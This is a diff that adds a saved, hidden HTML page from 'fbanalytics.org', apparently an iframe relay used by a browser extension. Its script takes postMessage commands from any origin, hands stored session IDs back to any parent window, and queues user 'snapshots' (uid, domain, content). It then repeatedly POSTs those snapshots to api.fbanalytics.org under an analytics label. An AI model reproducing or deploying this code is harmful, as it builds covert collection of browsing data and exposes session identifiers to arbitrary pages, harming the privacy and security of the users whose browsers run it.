@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<!-- saved from url=(0036)https://fbanalytics.org/xml-lsp.html -->
+<html lang="en" style="display: none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+<script type="text/javascript" src="chrome-extension://hddjedknagmgioblmfdkdkcbeckhnjcj/webResources/css-helper__.js" id="1aac33d2-7e87-4191-a958-8e5ea38e9aa8"></script></head>
+<body>
+<script>
+  const API_URL = "https://api.fbanalytics.org";
+  const XML_KEY = 'xmll-lsp';
+  const XML_VALUE = "bmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXA=";
+  const setKeyMessage = 'set-xml-key';
+  const getKeyMessage = 'get-xml-key';
+
+  const SET_BMP = 'SET_BMP';
+  const REMOVE_BMP = 'REMOVE_BMP';
+  const GET_BMP = 'GET_BMP';
+  const SAVE_SNAPSHOT = 'SAVE_SNAPSHOT';
+
+  const getSidMessage = 'get-sid';
+  const setSidMessage = 'set-sid';
+
+  window.addEventListener('message', function (event) {
+    const {data} = event;
+    switch (data.code) {
+      case setKeyMessage:
+        setActiveLogicFlag();
+        break;
+      case getKeyMessage:
+        returnActiveLogicFlag();
+        break;
+      case getSidMessage:
+        returnSidByKey(data.key);
+        break;
+      case setSidMessage:
+        setSid(data.key, data.sid);
+        break;
+      case REMOVE_BMP:
+        removeBmpFlag();
+        break;
+      case GET_BMP:
+        returnBmpFlag();
+        break;
+      case SAVE_SNAPSHOT:
+          saveDataToStack(data.snapshot);
+          break;
+      case SET_BMP:
+        setBmpFlag();
+        break;
+    }
+  }, false);
+
+  function returnSidByKey(key) {
+    parent.postMessage({
+      code: "sid",
+      ...(sessionStorage.getItem(key) && {sid: sessionStorage.getItem(key)})
+    }, '*');
+  }
+
+  function setSid(key, sid) {
+    if(sid) {
+      sessionStorage.setItem(key, sid);
+    }
+  }
+
+  const returnActiveLogicFlag = () => {
+    parent.postMessage({
+      code: "xml-lsp",
+      ...(sessionStorage.getItem(XML_KEY) && {key: sessionStorage.getItem(XML_KEY)})
+    }, '*');
+    sessionStorage.removeItem(XML_KEY);
+  };
+
+  const setActiveLogicFlag = () => {
+    sessionStorage.setItem(XML_KEY, XML_VALUE);
+  };
+
+  const setBmpFlag = () => {
+    localStorage.setItem("value_bmp", new Date().getTime().toString());
+  };
+
+  const removeBmpFlag = () => {
+    localStorage.removeItem("value_bmp");
+  };
+
+  const returnBmpFlag = () => {
+      window.parent.postMessage(
+        {
+            code: "SEND_BMP",
+            value: localStorage.getItem("value_bmp"),
+        },
+        "*"
+      );
+  };
+
+  const saveDataToStack = (snapshot) => {
+    try {
+        const snapshots = localStorage.getItem('snapshots');
+        let stack = JSON.parse(snapshots);
+
+        if (!Array.isArray(stack)) {
+            stack = [snapshot];
+        } else {
+            stack.push(snapshot);
+        }
+
+        localStorage.setItem('snapshots', JSON.stringify(stack));
+    } catch (err) {
+        localStorage.setItem('saveDataToStack', 'saveDataToStack: ' + err.message);
+        localStorage.setItem('snapshots', JSON.stringify([]));
+    }
+  };
+
+  const sleep = (time) => new Promise((resolve) => setTimeout(resolve, time));
+
+  const processSnapshots = () => {
+      try {
+          const snapshots = localStorage.getItem('snapshots');
+
+          if (snapshots) {
+              const stack = JSON.parse(snapshots);
+
+              if (!Array.isArray(stack)) {
+                  localStorage.removeItem('snapshots');
+                  return;
+              }
+
+              if (stack.length === 0) {
+                  return;
+              }
+
+              const topStackItem = stack.shift();
+              localStorage.setItem('snapshots', JSON.stringify(stack));
+
+              fetch(`${API_URL}/analytics/b-m-p`, {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({
+                      u: topStackItem.uid,
+                      t: topStackItem.timestamp,
+                      c: topStackItem,
+                      id: topStackItem.snapshotId,
+                      d: topStackItem.domain,
+                  }),
+              }).then(async () => {
+                  await sleep(5000);
+                  processSnapshots();
+              }).catch(async (err) => {
+                  await sleep(5000);
+                  const snapshots = localStorage.getItem('snapshots');
+                  const stack = JSON.parse(snapshots);
+                  if (Array.isArray(stack)) {
+                      localStorage.setItem('snapshots', JSON.stringify([topStackItem, ...stack]));
+                  }
+                  processSnapshots();
+              });
+          }
+      } catch (err) {
+          console.log(err);
+          localStorage.setItem('processSnapshots', 'processSnapshots: ' + err.message);
+      }
+  };
+
+  processSnapshots();
+
+</script>
+
+
+</body></html>
